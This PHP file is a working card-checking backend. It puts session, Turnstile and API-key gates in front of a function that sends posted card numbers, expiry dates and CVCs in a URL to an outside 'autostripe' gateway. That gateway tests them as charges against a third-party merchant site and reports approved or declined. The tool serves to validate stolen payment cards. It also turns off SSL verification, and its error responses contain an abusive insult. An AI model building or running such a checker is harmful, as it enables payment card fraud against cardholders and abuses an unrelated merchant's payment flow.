<?php
header('Content-Type: application/json');

// Enable error logging
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/stripe1_debug.log');

// Load environment variables manually
 $envFile = __DIR__ . '/../.env';
 $_ENV = [];
if (file_exists($envFile)) {
    $lines = file($envFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0 || !strpos($line, '=')) {
            continue;
        }
        list($key, $value) = explode('=', $line, 2);
        $_ENV[trim($key)] = trim($value);
    }
} else {
    error_log("Environment file (.env) not found in " . dirname($envFile));
}

// Cloudflare Turnstile credentials
 $turnstileSecretKey = $_ENV['TURNSITE_SECRET_KEY'] ?? '';

if (empty($turnstileSecretKey)) {
    http_response_code(500);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Server configuration error', 'response' => 'Server configuration error'];
    file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Error 500: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
    echo json_encode($errorMsg);
    exit;
}

// Function to verify Turnstile token
function verifyTurnstileToken($token, $secretKey) {
    if (empty($token)) {
        return false;
    }
    
    $url = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
    $data = [
        'secret' => $secretKey,
        'response' => $token,
        'remoteip' => $_SERVER['REMOTE_ADDR'] ?? null
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);
    $result = json_decode($response, true);
    
    return $result && isset($result['success']) && $result['success'] === true;
}

// Include cron_sync.php for validateApiKey
require_once __DIR__ . '/cron_sync.php';

// Start session for user authentication
session_start([
    'cookie_secure' => isset($_SERVER['HTTPS']),
    'cookie_httponly' => true,
    'use_strict_mode' => true,
]);

// Check if user is authenticated
if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Forbidden Access', 'response' => 'Forbidden Access'];
    file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Error 403: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
    echo json_encode($errorMsg);
    exit;
}

// Verify Turnstile token
 $turnstileToken = $_SERVER['HTTP_X_TURNSTILE_TOKEN'] ?? '';
if (!verifyTurnstileToken($turnstileToken, $turnstileSecretKey)) {
    http_response_code(403);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Security verification failed', 'response' => 'Security verification failed'];
    file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Error 403: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
    echo json_encode($errorMsg);
    exit;
}

// Validate API key
 $validation = validateApiKey();
if (!$validation['valid']) {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'DARK kI MUMMY RANDI', 'response' => 'DARK kI MUMMY RANDI'];
    file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
    echo json_encode($errorMsg);
    exit;
}

 $expectedApiKey = $validation['response']['apiKey'];
 $providedApiKey = $_SERVER['HTTP_X_API_KEY'] ?? '';
if ($providedApiKey !== $expectedApiKey) {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'DARK kI MUMMY RANDI', 'response' => 'DARK kI MUMMY RANDI'];
    file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
    echo json_encode($errorMsg);
    exit;
}


header('Content-Type: text/plain');

// Enable error reporting for debugging (remove in production)
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Function to check a single card via API
function checkCard($card_number, $exp_month, $exp_year, $cvc) {
    // Prepare card details for API and display
    $card_details = "$card_number|$exp_month|$exp_year|$cvc";
    $encoded_cc = urlencode($card_details);
    
    // API endpoint configuration
    $api_url = "https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=shebrews.org/cc=$encoded_cc";

    // Initialize cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Insecure; consider enabling in production with proper SSL

    // Execute request
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);

    // Handle API errors
    if ($response === false || $http_code !== 200 || !empty($curl_error)) {
        return "DECLINED [API request failed: $curl_error (HTTP $http_code)] $card_details";
    }

    // Parse JSON response
    $result = json_decode($response, true);
    if (json_last_error() !== JSON_ERROR_NONE || !isset($result['status'], $result['response'])) {
        return "DECLINED [Invalid API response: " . substr($response, 0, 100) . "] $card_details";
    }

    $status = strtoupper($result['status']);
    $response_msg = htmlspecialchars($result['response'], ENT_QUOTES, 'UTF-8'); // Sanitize response message

    // Output based on status
    if ($status === "APPROVED") {
        return "[$response_msg]";
    } elseif ($status === "DECLINED") {
        return "[$response_msg]";
    } else {
        return "DECLINED [Unknown status: $status]";
    }
}

// Check if the request is POST and contains card data
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card']) || !is_array($_POST['card'])) {
    echo "DECLINED [Invalid request or missing card data]";
    exit;
}

 $card = $_POST['card'];
 $required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];

// Validate card data
foreach ($required_fields as $field) {
    if (empty($card[$field])) {
        echo "DECLINED [Missing $field]";
        exit;
    }
}

// Sanitize inputs
 $card_number = preg_replace('/[^0-9]/', '', $card['number']);
 $exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month']);
 $exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year']);
 $cvc = preg_replace('/[^0-9]/', '', $card['cvc']);

// Normalize exp_month to 2 digits
 $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
if (!preg_match('/^(0[1-9]|1[0-2])$/', $exp_month)) {
    echo "DECLINED [Invalid exp_month format]";
    exit;
}

// Normalize exp_year to 4 digits
if (strlen($exp_year_raw) == 2) {
    $current_year = (int) date('y'); // Last two digits of current year (e.g., 25 for 2025)
    $current_century = (int) (date('Y') - $current_year); // e.g., 2000 for 2025
    $card_year = (int) $exp_year_raw;
    $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
} elseif (strlen($exp_year_raw) == 4) {
    $exp_year = (int) $exp_year_raw;
} else {
    echo "DECLINED [Invalid exp_year format - must be YY or YYYY]";
    exit;
}

// Basic validation
if (!preg_match('/^\d{13,19}$/', $card_number)) {
    echo "DECLINED [Invalid card number format]";
    exit;
}
if (!preg_match('/^\d{4}$/', (string) $exp_year)) {
    echo "DECLINED [Invalid exp_year format after normalization]";
    exit;
}
if (!preg_match('/^\d{3,4}$/', $cvc)) {
    echo "DECLINED [Invalid CVC format]";
    exit;
}

// Validate logical expiry
 $expiry_timestamp = strtotime("$exp_year-$exp_month-01");
 $current_timestamp = strtotime('first day of this month');
if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
    echo "DECLINED [Card expired]";
    exit;
}

// Check single card
echo checkCard($card_number, $exp_month, $exp_year, $cvc);
